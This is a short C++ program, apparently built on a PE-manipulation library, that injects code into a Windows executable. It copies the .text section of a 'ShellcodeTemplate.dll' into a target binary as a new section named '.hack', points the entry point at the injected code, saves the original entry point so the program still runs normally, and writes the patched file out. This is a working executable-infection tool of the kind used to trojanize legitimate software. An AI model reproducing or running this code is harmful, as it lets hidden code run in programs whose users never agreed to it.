#include "stdafx.h"

#include "PeMaster/PeMaster.h"

int
wmain(
	uint16_t argc,
	wchar_t** argv
)
{
	spdlog::set_level(spdlog::level::debug);

	//std::string pathTarget = R"(C:\Windows\system32\kernel32.dll)";
	std::string pathTemplate = R"(.\ShellcodeTemplate.dll)";
	std::string pathTarget = R"(E:\upx\upx.exe)";
	PeMaster::Pe objTemplate(pathTemplate);
	PeMaster::Pe objTarget(pathTarget);

	// Get and copy the section
	auto secText = objTemplate.getSectionByName(".text");
	auto exports = objTemplate.enumExport();
	uint32_t offsetMain = 0;
	uint32_t offsetVar = 0;
	for (auto& exp : exports) {
		if (exp.Name == "main") {
			offsetMain = exp.Rva - secText.VirtualAddress;
			spdlog::info("Found main at offset: 0x{:x}", offsetMain);
		}
		if (exp.Name == "OriginalEntryPoint") {
			offsetVar = exp.Rva - secText.VirtualAddress;
			spdlog::info("Found var at offset: 0x{:x}", offsetVar);
		}
	}

	auto& secAdded = objTarget.getSectionHeaders().emplace_back(secText);
	secAdded.Name[0] = '.';
	secAdded.Name[1] = 'h';
	secAdded.Name[2] = 'a';
	secAdded.Name[3] = 'c';
	secAdded.Name[4] = 'k';
	objTarget.rebuild();

	auto vaOriginalMain = objTarget.getNtHeaders().getOptionalHeader().ImageBase + objTarget.getNtHeaders().getOptionalHeader().AddressOfEntryPoint;
	auto rvaNewMain = secAdded.VirtualAddress + offsetMain;
	objTarget.getNtHeaders().getOptionalHeader().AddressOfEntryPoint = rvaNewMain;
	(*(uintptr_t*)(secAdded.m_content.data() + offsetVar)) = vaOriginalMain;

	objTarget.rebuild();
	objTarget.write(R"(.\qwq.exe)");

	return 0;
}
